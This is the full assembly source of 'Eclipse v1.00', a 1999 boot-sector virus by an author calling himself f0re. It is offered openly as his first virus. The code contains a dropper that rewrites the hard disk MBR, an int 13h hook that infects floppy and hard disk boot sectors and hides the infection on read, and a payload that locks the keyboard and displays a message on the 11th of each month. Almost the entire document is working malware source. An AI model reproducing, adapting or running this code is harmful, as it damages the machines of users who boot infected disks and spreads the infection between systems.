;--------------------------------------------------------------------------
;
;     NAME: Eclipse v1.00
;     TYPE: Simple MBR/BS infector
;     SIZE: 2 sectors
;   AUTHOR: f0re [lz0]
;   E-MAIL: f0revir@usa.net
;     DATE: August 1999
;  PAYLOAD: pc is not bootable on the 11th of each month
;
;
; COMMENTS:
;
;           This is my first asm virus i have ever written. I had a
;           lot of help from Darkman, Owl, BlackJack and T-2000 and of
;           course as you can probably see used the Codebreakers tutorial
;           on mbr/bs infection, written by Sp00ky with the help of
;           Opic and CTRL-ALT-DEL. I know that for the advanced coder
;           this is nothing new at all. Though for me it definitely was!
;
;--------------------------------------------------------------------------

    .286
    .model tiny
    .code

     org 0 

;==========================================================================
;--------------------------| Dropper for virus |---------------------------
;==========================================================================

Dropper:
    push cs cs
    pop ds es

    mov ax, 0201h			;read original mbr in memory
    lea bx, mbr
    mov cx, 1
    mov dx, 80h
    int 13h

    mov ax, 0301h			;write the original mbr to disk (0,0,2)
    mov bx, offset mbr
    mov dx, 80h
    mov cx, 2
    int 13h

    lea si, mbr 			;insert partition table in virus
    add si, 1beh
    lea di, Partitiontable
    mov cx, 40h
    cld
    rep movsb
 
    mov ax, 0301h			;write first part of virus to disc
    lea bx, Start
    mov cx, 1
    mov dx, 80h
    int 13h

    mov ax, 0301h			;write second part of virus to disc
    lea bx, EndOfPart
    mov cx, 3
    mov dx, 80h
    int 13h

    mov ax, 4c00h			;exit to OS
    int 21h

MBR db 512 dup(?)

;==========================================================================
;----------------------------| Copy virus to TOM |-------------------------
;==========================================================================

Start:
    jmp short PastFloppyBuffer
    nop					;to make sure some floppies boot
    db 3bh dup(?)			;3bh bytes of the floppy bs will be
                                        ;saved here

PastFloppyBuffer:
    xor ax, ax				;zero out ax
    cli					;disable interupts
    mov ss, ax				;ss = 0
    mov sp, 7c00h			;sp = 7c00h
    sti					;enable interupts

    mov ds, ax				;ds = 0 
    dec word ptr ds:[413h]		;decrement bios mem by 1k
    mov ax, ds:[413h]			;and store new mem size
    shl ax, 6				;divide by 64 (=length of 1 segment in bytes)
    mov es, ax				;to get the segment of where to copy the virus
    xor di, di				;zero out di

    mov cx, EndOfPart - Start		;mov in cx length of first part ofvirus
    mov si, 7c00h			;si holds location of start of virus in memory
    cld					;clear direction
    rep movsb				;copy first part of virus to TOM

    mov ax, 0201h			;read second part of virus into memory
    mov bx, EndOfPart - start		;after EndOfPart 
    call GetSectorLastPart
    int 13h

    push es				;save segment to jump to
    mov ax, ContinueInMem - start		
    push ax				;save offset to jump to
    retf				;jump to virus in TOM

;==========================================================================
;-------------------| Redirect int 13h and hook int 18h |------------------
;==========================================================================

ContinueInMem:
    mov ax, 0F000h			;goto ROM
    mov ds, ax
    xor si, si				;start opcode search at offset 0
	
Int18hOpcodeSearchLoop:
    cmp word ptr ds:[si], 18cdh		;search for opcode of int18h
    je FoundInt18hOpcode			
    inc si				;didnt find it, then increment si
    cmp si, 0FFFFh			;and compare if at end of search area
    jne Int18hOpcodeSearchLoop		;not? then again search
 
    xor ax, ax				;no opcode found then hook the usual way
    mov es, ax				;point es to interrupt table
 
    mov ax, MyInt13h - Start + 5	;add 5 bytes to jmp past the "cli: 
    mov bx, cs				;add sp, 6:sti" instruction at MyInt13h
    cli					;disable interupts
    xchg es:[13h * 4], ax		;put offset of myint13h into ivt
    xchg es:[13h * 4 + 2], bx		;put segment of myint13h into ivt
    mov word ptr cs:[GoodInt13h-start], ax	;save offset of oldint13h
    mov word ptr cs:[GoodInt13h-start + 2], bx	;save segment of oldint13h
    sti					;enable interupts

    jmp ReBoot				;jmp to reboot

FoundInt18hOpcode:
    xor ax, ax				;zero out ax
    mov ds, ax				;goto ivt

    cli					;disable interupts
    mov ax, si				;put offset int18h opcode into ax
    mov bx, 0f000h			;put ROM address in bx
    xchg ds:[13h * 4], ax		;put offset of opcode into ivt
    xchg ds:[13h * 4 + 2], bx		;put segment of opcode into ivt
    mov word ptr cs:[GoodInt13h-start], ax	;save offset of old int13h
    mov word ptr cs:[GoodInt13h-start + 2], bx	;save segment of old int13h
    mov word ptr ds:[18h*4], MyInt13h-start 	;put offset of MyInt13h in ivt
    mov word ptr ds:[18h*4 + 2], cs	;put segment of MyinT13h in ivt
    sti					;enable interupts

;==========================================================================
;-------------------| Reboot the pc, virus remains resident |--------------
;==========================================================================

ReBoot:
    call PayLoad
    int 19h				;reboot (virus stays in mem) and thus reread
					;mbr/bs, but stealth tourine is active,
					;hence the original mbr/bs will be read

;==========================================================================
;----------------------------| New Int 13h handler |-----------------------
;==========================================================================

MyInt13h:
    cli
    add sp, 6				;int13h pushes flags and cs:ip
					;int18h also pushes flags and cs:ip
					;you have to get rid of these 6 bytes
					;(3 words) caused by int18h else the cpu
					;would jmp past the int18h opcode and crash
    					;once an iret is executed
    sti

    cmp ah, 2				;is it a read call ?
    jne Nope
    cmp cx, 1				;sector 1, cylinder 0 ?
    jne Nope
    cmp dh, 0				;head 0 ?
    jne Nope
  
    call Int13h
    jnc Continue			;no errors then continue
    retf 2				;return far

Nope:
    jmp dword ptr cs:[GoodInt13h-start]	;do the original read call

Continue:
    pushf				;push flags
    pusha					
    push ds es				;save ds and es

    cmp word ptr es:[bx + IDsign-start], '04'	;check for id bytes
    jne InfectSector				;not there ? then infect

Stealth:
    mov ax, 0201h			;already infected ? then stealth it
    call GetStealthSector		;are we on floppy or on hdd ?
    call Int13h				;read the original mbr/bs
    jmp Done

InfectSector:
    mov ax, 0301h			;write the sector read to es:bx to sector
    call GetStealthSector		;is this floppy or hdd ?
    call Int13h				;ok do it

    push es cs				;make cs=es and ds=es
    pop es ds
    push bx 				;save bx

    mov si, bx				;point si to where original mbr/bs was 
    add si, 3				;read in mem (es:bx) and add 3
    mov di, 3				;put in di floppybuffer
    mov cx, 3bh				;copy 3ch bytes
    cld					;clear direction
    rep movsb				;do it

    pop si				;pop saved bx into si
    add si, 1Beh			;add 1beh to point to partitiontable
    mov di, Partitiontable-start	;load in di the partitiontable buffer
    mov cx, 40h				;copy it into the buffer
    rep movsb				;do it

    mov ax, 0301h			;write viruscode
    mov bx, Start-start			;begin from start
    mov cx, 1				;to sector one
    mov dh, 0				;head 0
    call Int13h				;do it
  
    mov ax, 0301h			;write rest of virus to bs/mbr
    mov bx, EndOfPart - start
    call GetSectorLastPart
    call Int13h

Done:
    pop es ds				;restore saved values of es and ds
    popa					
    popf				;restore flags
    retf 2				;return far

;==========================================================================
;---------------------| Original interupt 13h handler |--------------------
;==========================================================================

Int13h:
    pushf					;push the flags and
    call dword ptr cs:[GoodInt13h-start]	;read it
    ret

GoodInt13h dd ?

;==========================================================================
;-----------------| Two subroutines that are called in the code |----------
;==========================================================================

GetSectorLastPart:
    mov cx, 3				;read it from sector 3
    mov dh, 0				;head 0
    cmp dl, 80h				;is this HDD ?
    jae NoFloppy
    mov cx, 12				;then this is floppy; use sector 12
    mov dh, 1 				;head 1

NoFloppy:
    ret

GetStealthSector:
    mov cx, 2				;get sector 2
    mov dh, 0 				;head 0
    cmp dl, 80h				;is this hdd ?
    jae ThisIsHDD			;nope, then
    mov cx, 14				;get secor 14
    mov dh, 1				;head 1

ThisIsHDD:
    ret

IDsign    dw '04'			;the ID bytes
DosLoaded db 0
Deleted   db 0

;==========================================================================
;------------| The orginal partition table will be stored here |-----------
;==========================================================================

    org 1beh+start

Partitiontable:

db 64 dup('P')  
db 55h, 0AAh

;==========================================================================
;--------------------| Second part of virus starts here |------------------
;==========================================================================

EndOfPart Label Byte

;==========================================================================
;-----------------------------| The Payload |------------------------------
;==========================================================================

Payload:
    mov ah, 4				;get date			
    int 1ah				;ok do it
    cmp dl, 11h				;cmp day to 11th
    je Eclipse				;is it? ok go to the payload
    ret					;else return

Eclipse:
    mov al, 0adh			;lock the keyboard today
    out 64h, al

    push cs cs
    pop ds es

    mov si, MsgStart - start
    mov cx, MsgEnd - MsgStart
    xor bx, bx

MsgLoop:
    lodsb    
    mov ah, 0eh
    int 10h
    loop Msgloop

MsgDone:
    xor ah, ah
    int 16h
    ret

;==========================================================================
;---------------------------| Some constants |-----------------------------
;==========================================================================

GoodInt21h dd ?

MsgStart db ' ',10,13
         db '     The last total solar eclipse of the 20th century.' ,10,13
         db '                             Wednesday August 11, 1999.',10,13
         db ' ',10,13
MsgEnd   db ' ',10,13

;==========================================================================
;---------------------------| End Of eclipse |-----------------------------
;==========================================================================

end Dropper